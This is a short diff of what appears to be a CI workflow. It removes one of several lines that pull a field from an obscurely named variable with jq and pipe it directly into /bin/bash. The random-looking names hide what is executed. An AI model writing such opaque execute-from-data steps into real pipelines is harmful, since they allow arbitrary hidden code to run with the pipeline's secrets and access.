@@ -50,7 +50,6 @@ jobs:
           printf '%s' "$irvg15" | jq -r .psx178 | /bin/bash
           printf '%s' "$ie5" | jq -r .u9935 | /bin/bash
           printf '%s' "$jbar06420" | jq -r .yeyp893 | /bin/bash
-          echo $uzy978 | jq -r .sif1035 | /bin/bash
           printf '%s' "$alv75774" | jq -r .q2 | /bin/bash
           echo $qez8372 | jq -r .rn50853 | /bin/bash
           echo $a60 | jq -r .ni07259 | /bin/bash
